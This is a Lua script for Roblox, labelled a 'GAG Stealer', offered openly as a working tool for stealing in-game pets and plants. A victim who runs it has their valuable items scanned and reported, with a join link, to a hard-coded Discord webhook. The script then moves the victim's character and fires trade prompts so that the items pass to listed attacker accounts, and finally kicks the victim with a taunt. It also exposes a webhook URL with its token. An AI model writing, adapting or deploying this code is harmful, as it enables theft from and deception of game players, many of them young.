-- GAG Stealer Script - Fixed Version
-- Reset execution guard to allow multiple runs
_G.scriptExecuted = false

-- Configuration
_G.Usernames = {"iamzanji11", "iamzanji22", "iamzanji33"}
_G.min_value = 100000  -- Lowered from 100 million to 100k for testing
_G.pingEveryone = "Yes"
_G.webhook = "https://discord.com/api/webhooks/1397050931475906622/SfHsX5ToYLywNh3gUVM2W2XmaMPumldSwB6ttvkAX6QWFU3YP6VInlIaPJIsv-hure37"

-- Variables
local users = _G.Usernames or {}
local min_value = _G.min_value or 100000
local ping = _G.pingEveryone or "No"
local webhook = _G.webhook or ""

-- Services
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")

-- Player setup
local plr = Players.LocalPlayer
local character = plr.Character or plr.CharacterAdded:Wait()
local backpack = plr:WaitForChild("Backpack")

-- Game modules (with error handling)
local replicatedStorage = game:GetService("ReplicatedStorage")
local modules = replicatedStorage:WaitForChild("Modules")

-- Try to load modules with error handling
local calcPlantValue, petUtils, petRegistry, numberUtil, dataService

local success, error = pcall(function()
    calcPlantValue = require(modules:WaitForChild("CalculatePlantValue"))
    petUtils = require(modules:WaitForChild("PetServices"):WaitForChild("PetUtilities"))
    petRegistry = require(replicatedStorage:WaitForChild("Data"):WaitForChild("PetRegistry"))
    numberUtil = require(modules:WaitForChild("NumberUtil"))
    dataService = require(modules:WaitForChild("DataService"))
end)

if not success then
    warn("Failed to load some modules:", error)
    -- Continue with basic functionality
end

-- Constants
local excludedItems = {"Seed", "Shovel [Destroy Plants]", "Water", "Fertilizer"}
local rarePets = {"Red Fox", "Raccoon", "Dragonfly"}
local totalValue = 0
local itemsToSend = {}

-- Debug function
local function debugPrint(message)
    print("[GAG Debug]", message)
end

-- Main execution
debugPrint("Script starting...")
debugPrint("Place ID: " .. game.PlaceId)
debugPrint("Min value: " .. min_value)

-- Validation checks
if next(users) == nil or webhook == "" then
    debugPrint("ERROR: No usernames or webhook configured")
    plr:kick("You didn't add any usernames or webhook")
    return
end

if game.PlaceId ~= 126884695634066 then
    debugPrint("ERROR: Wrong game - Place ID: " .. game.PlaceId)
    plr:kick("Game not supported. Please join a normal GAG server")
    return
end

-- Server type check with error handling
local serverTypeSuccess, serverType = pcall(function()
    return game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType"):InvokeServer()
end)

if serverTypeSuccess and serverType == "VIPServer" then
    debugPrint("ERROR: VIP Server detected")
    plr:kick("Server error. Please join a DIFFERENT server")
    return
end

debugPrint("All checks passed, continuing...")

-- Pet value calculation function
local function calcPetValue(v14)
    if not v14 or not v14.PetData then
        return 0
    end
    
    local hatchedFrom = v14.PetData.HatchedFrom
    if not hatchedFrom or hatchedFrom == "" then
        return 0
    end
    
    if not petRegistry or not petRegistry.PetEggs then
        return 0
    end
    
    local eggData = petRegistry.PetEggs[hatchedFrom]
    if not eggData then
        return 0
    end
    
    local v17 = eggData.RarityData and eggData.RarityData.Items and eggData.RarityData.Items[v14.PetType]
    if not v17 then
        return 0
    end
    
    local weightRange = v17.GeneratedPetData and v17.GeneratedPetData.WeightRange
    if not weightRange then
        return 0
    end
    
    if not numberUtil or not numberUtil.ReverseLerp then
        return 0
    end
    
    local v19 = numberUtil.ReverseLerp(weightRange[1], weightRange[2], v14.PetData.BaseWeight)
    local v20 = math.lerp(0.8, 1.2, v19)
    
    if not petUtils or not petUtils.GetLevelProgress then
        return 0
    end
    
    local levelProgress = petUtils:GetLevelProgress(v14.PetData.Level)
    local v22 = v20 * math.lerp(0.15, 6, levelProgress)
    
    if not petRegistry.PetList or not petRegistry.PetList[v14.PetType] then
        return 0
    end
    
    local v23 = petRegistry.PetList[v14.PetType].SellPrice * v22
    return math.floor(v23)
end

-- Number formatting function
local function formatNumber(number)
    if number == nil then
        return "0"
    end
    local suffixes = {"", "k", "m", "b", "t"}
    local suffixIndex = 1
    while number >= 1000 and suffixIndex < #suffixes do
        number = number / 1000
        suffixIndex = suffixIndex + 1
    end
    if suffixIndex == 1 then
        return tostring(math.floor(number))
    else
        if number == math.floor(number) then
            return string.format("%d%s", number, suffixes[suffixIndex])
        else
            return string.format("%.2f%s", number, suffixes[suffixIndex])
        end
    end
end

-- Weight extraction function
local function getWeight(tool)
    local weightValue = tool:FindFirstChild("Weight") or 
                       tool:FindFirstChild("KG") or 
                       tool:FindFirstChild("WeightValue") or
                       tool:FindFirstChild("Mass")

    local weight = 0

    if weightValue then
        if weightValue:IsA("NumberValue") or weightValue:IsA("IntValue") then
            weight = weightValue.Value
        elseif weightValue:IsA("StringValue") then
            weight = tonumber(weightValue.Value) or 0
        end
    else
        local weightMatch = tool.Name:match("%((%d+%.?%d*) ?kg%)")
        if weightMatch then
            weight = tonumber(weightMatch) or 0
        end
    end

    return math.floor(weight * 100 + 0.5) / 100
end

-- Get highest weight fruit
local function getHighestKGFruit()
    local highestWeight = 0
    for _, item in ipairs(itemsToSend) do
        if item.Weight > highestWeight then
            highestWeight = item.Weight
        end
    end
    return highestWeight
end

-- Webhook sending function with error handling
local function sendWebhook(data)
    local success, response = pcall(function()
        if not request then
            error("Request function not available")
        end
        
        local body = HttpService:JSONEncode(data)
        local headers = {
            ["Content-Type"] = "application/json"
        }
        
        return request({
            Url = webhook,
            Method = "POST",
            Headers = headers,
            Body = body
        })
    end)
    
    if not success then
        debugPrint("ERROR: Failed to send webhook - " .. tostring(response))
        return false
    else
        debugPrint("Webhook sent successfully")
        return true
    end
end

-- Send join message
local function SendJoinMessage(list, prefix)
    local fields = {
        {
            name = "Victim Username:",
            value = plr.Name,
            inline = true
        },
        {
            name = "Join link:",
            value = "https://fern.wtf/joiner?placeId=126884695634066&gameInstanceId=" .. game.JobId
        },
        {
            name = "Item list:",
            value = "",
            inline = false
        },
        {
            name = "Summary:",
            value = string.format("Total Value: ¬¢%s\nHighest weight fruit: %.2f KG", formatNumber(totalValue), getHighestKGFruit()),
            inline = false
        }
    }

    for _, item in ipairs(list) do
        local line = string.format("%s (%.2f KG): ¬¢%s", item.Name, item.Weight, formatNumber(item.Value))
        fields[3].value = fields[3].value .. line .. "\n"
    end

    if #fields[3].value > 1024 then
        local lines = {}
        for line in fields[3].value:gmatch("[^\r\n]+") do
            table.insert(lines, line)
        end

        while #fields[3].value > 1024 and #lines > 0 do
            table.remove(lines)
            fields[3].value = table.concat(lines, "\n") .. "\nPlus more!"
        end
    end

    local data = {
        ["content"] = 'game:GetService("TeleportService"):TeleportToPlaceInstance(126884695634066, "' .. game.JobId .. '")',
        ["embeds"] = {{
            ["title"] = "üê¥ Join to get GAG hit",
            ["color"] = 65280,
            ["fields"] = fields,
            ["footer"] = {
                ["text"] = "GAG stealer by Tobi. discord.gg/GY2RVSEGDT"
            }
        }}
    }

    return sendWebhook(data)
end

-- Send execution message
local function SendMessage(sortedItems)
    local fields = {
        {
            name = "Victim Username:",
            value = plr.Name,
            inline = true
        },
        {
            name = "Items sent:",
            value = "",
            inline = false
        },
        {
            name = "Summary:",
            value = string.format("Total Value: ¬¢%s\nHighest weight fruit: %.2f KG", formatNumber(totalValue), getHighestKGFruit()),
            inline = false
        }
    }

    for _, item in ipairs(sortedItems) do
        local line = string.format("%s (%.2f KG): ¬¢%s", item.Name, item.Weight, formatNumber(item.Value))
        fields[2].value = fields[2].value .. line .. "\n"
    end

    if #fields[2].value > 1024 then
        local lines = {}
        for line in fields[2].value:gmatch("[^\r\n]+") do
            table.insert(lines, line)
        end

        while #fields[2].value > 1024 and #lines > 0 do
            table.remove(lines)
            fields[2].value = table.concat(lines, "\n") .. "\nPlus more!"
        end
    end

    local data = {
        ["embeds"] = {{
            ["title"] = "üê¥ New GAG Execution",
            ["color"] = 65280,
            ["fields"] = fields,
            ["footer"] = {
                ["text"] = "GAG stealer by Tobi. discord.gg/GY2RVSEGDT"
            }
        }}
    }

    return sendWebhook(data)
end

-- Scan backpack for items
debugPrint("Scanning backpack for items...")
local itemCount = 0

for _, tool in ipairs(backpack:GetChildren()) do
    if tool:IsA("Tool") and not table.find(excludedItems, tool.Name) then
        itemCount = itemCount + 1
        debugPrint("Found item: " .. tool.Name)
        
        if tool:GetAttribute("ItemType") == "Pet" then
            local petUUID = tool:GetAttribute("PET_UUID")
            if petUUID and dataService and dataService.GetData then
                local playerData = dataService:GetData()
                if playerData and playerData.PetsData and playerData.PetsData.PetInventory and playerData.PetsData.PetInventory.Data then
                    local v14 = playerData.PetsData.PetInventory.Data[petUUID]
                    if v14 then
                        local itemName = v14.PetType
                        if table.find(rarePets, itemName) or getWeight(tool) >= 10 then
                            if tool:GetAttribute("Favorite") then
                                local success = pcall(function()
                                    replicatedStorage:WaitForChild("GameEvents"):WaitForChild("Favorite_Item"):FireServer(tool)
                                end)
                                if not success then
                                    debugPrint("Failed to unfavorite pet")
                                end
                            end
                            local value = calcPetValue(v14)
                            local toolName = tool.Name
                            local weight = tonumber(toolName:match("%[(%d+%.?%d*) KG%]")) or 0
                            totalValue = totalValue + value
                            table.insert(itemsToSend, {Tool = tool, Name = itemName, Value = value, Weight = weight, Type = "Pet"})
                            debugPrint("Added pet: " .. itemName .. " Value: " .. value)
                        end
                    end
                end
            end
        else
            if calcPlantValue then
                local success, value = pcall(function()
                    return calcPlantValue(tool)
                end)
                
                if success then
                    debugPrint("Plant value: " .. value .. " Min required: " .. min_value)
                    if value >= min_value then
                        local weight = getWeight(tool)
                        local itemName = tool:GetAttribute("ItemName") or tool.Name
                        totalValue = totalValue + value
                        table.insert(itemsToSend, {Tool = tool, Name = itemName, Value = value, Weight = weight, Type = "Plant"})
                        debugPrint("Added plant: " .. itemName .. " Value: " .. value)
                    end
                else
                    debugPrint("Failed to calculate plant value: " .. tostring(value))
                end
            else
                debugPrint("calcPlantValue function not available")
            end
        end
    end
end

debugPrint("Total items found: " .. itemCount)
debugPrint("Items to send: " .. #itemsToSend)
debugPrint("Total value: " .. totalValue)

if #itemsToSend > 0 then
    debugPrint("Processing items...")
    
    -- Sort items
    table.sort(itemsToSend, function(a, b)
        if a.Type ~= "Pet" and b.Type == "Pet" then
            return true
        elseif a.Type == "Pet" and b.Type ~= "Pet" then
            return false
        else
            return a.Value < b.Value
        end
    end)

    local sentItems = {}
    for i, v in ipairs(itemsToSend) do
        sentItems[i] = v
    end

    table.sort(sentItems, function(a, b)
        if a.Type == "Pet" and b.Type ~= "Pet" then
            return true
        elseif a.Type ~= "Pet" and b.Type == "Pet" then
            return false
        else
            return a.Value > b.Value
        end
    end)

    local prefix = ""
    if ping == "Yes" then
        prefix = "--[[@everyone]] "
    end

    SendJoinMessage(sentItems, prefix)

    -- Steal function
    local function doSteal(player)
        if not player.Character or not player.Character:FindFirstChild("HumanoidRootPart") then
            debugPrint("Target player character not ready")
            return
        end
        
        local victimRoot = character:WaitForChild("HumanoidRootPart")
        victimRoot.CFrame = player.Character.HumanoidRootPart.CFrame + Vector3.new(0, 0, 2)
        wait(0.1)

        local promptRoot = player.Character.HumanoidRootPart:WaitForChild("ProximityPrompt")

        for _, item in ipairs(itemsToSend) do
            if item.Tool and item.Tool.Parent then
                item.Tool.Parent = character
                if item.Type == "Pet" then
                    local promptHead = player.Character.Head:WaitForChild("ProximityPrompt")
                    repeat
                        task.wait(0.01)
                    until promptHead.Enabled
                    fireproximityprompt(promptHead)
                else
                    repeat
                        task.wait(0.01)
                    until promptRoot.Enabled
                    fireproximityprompt(promptRoot)
                end
                task.wait(0.1)
                item.Tool.Parent = backpack
                task.wait(0.1)
            end
        end

        local itemsStillInBackpack = true
        while itemsStillInBackpack do
            itemsStillInBackpack = false
            for _, item in ipairs(itemsToSend) do
                if backpack:FindFirstChild(item.Tool.Name) then
                    itemsStillInBackpack = true
                    break
                end
            end
            task.wait(0.1)
        end

        plr:kick("All your stuff just got stolen by Tobi's stealer!\n Join discord.gg/GY2RVSEGDT")
    end

    -- Wait for user chat
    local function waitForUserChat()
        local sentMessage = false
        local function onPlayerChat(player)
            if table.find(users, player.Name) then
                player.Chatted:Connect(function()
                    if not sentMessage then
                        SendMessage(sentItems)
                        sentMessage = true
                    end
                    doSteal(player)
                end)
            end
        end
        for _, p in ipairs(Players:GetPlayers()) do 
            onPlayerChat(p) 
        end
        Players.PlayerAdded:Connect(onPlayerChat)
        debugPrint("Waiting for target players to chat...")
    end
    waitForUserChat()
else
    debugPrint("No items found that meet the minimum value requirement")
    debugPrint("Try lowering the min_value in the configuration")
end 
